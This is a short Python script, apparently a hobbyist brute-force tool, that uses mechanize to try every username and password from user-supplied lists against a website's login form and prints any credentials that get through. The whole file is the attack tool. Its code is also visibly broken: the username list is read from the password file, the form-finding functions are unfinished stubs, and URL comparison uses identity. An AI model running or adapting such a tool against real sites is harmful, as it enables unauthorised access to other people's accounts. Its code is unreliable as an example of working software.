""" Simple non-captcha brute force program - checks `109 """
import subprocess
from mechanize import Browser, FormNotFoundError

url = input("$ Enter URL: ")
wordlist = input("$ Enter path to wordlist: ")
userlist = input("$ Enter path to userlist: ")

# parse passwords and build array
print("$ Generating wordlist...", end='')
try:
    with open(wordlist, 'r') as password_file:
        passwords = password_file.read().splitlines('\n')
except FileNotFoundError:
    print(" File not found.")
    exit()
except:
    print(" Misc Error.")
    exit()
print(" Success!")


# parse userlist and build array
print("$ Generating userlist...", end='')
try:
    with open(wordlist, 'r') as username_file:
        usernames = username_file.read().splitlines('\n')
except FileNotFoundError:
    print(" File not found.")
    exit()
except:
    print(" Misc Error.")
    exit()
print(" Success!")


# generate browser
def make_browser_post(target):
    """ initializes mechanize browser object """
    try:
        browser = Browser()
        browser.open(target)
        browser.method = "POST"
        return browser
    except FormNotFoundError as err_msg:
        print("$ Error: " + str(err_msg))
        exit()

# Webpage form queries
def get_user_form(forms):
    """ looks for username form in form list """
    for form in forms:
        # if something then
        return form
    return None

def get_pass_form(forms):
    """ looks for password form in form list """
    for form in forms:
        # if something then
        return form
    return None

def get_submission(forms):
    """ looks for submission input in form list """
    for form in forms:
        # if something then
        return form
    return None

def verify_response(new_url):
    """ makes sure url is logged in and not password
        recovery or bruteforce protection """
    buzzwords = ["login", "recover", "Login", "Recover"]
    for word in buzzwords:
        if word in new_url:
            return False
    return True

# bruteforce loop
def bruteforce_loop(br, users, words, og_url):
    """ get forms and enters inputs, then submits """
    all_forms = br.forms()
    user_form = get_user_form(all_forms)
    pass_form = get_pass_form(all_forms)
    submit_button = get_submission(all_forms)

    if user_form is None:
        print("$ Error: Could not find user form.")
        exit()
    if pass_form is None:
        print("$ Error: Could not find pass space.")
        exit()
    for user in users:
        br.select_form(user_form)
        br.set_value(user)
        for password in words:
            br.select_form(pass_form)
            br.set_value(password)

            br.select_form(submit_button)
            br.click()

            response_url = br.geturl()

            if response_url is not og_url and verify_response(response_url):
                print('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n')
                print("$ Success! Found a match.")
                print(f'$ Username: {user}\n$ Password: {password}\n')
                print('$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$\n')
                return True
    return False

if not bruteforce_loop(make_browser_post(url), usernames, passwords, url):
    print("$ No dice. Checked " + str(len(passwords)) + "passwords.")
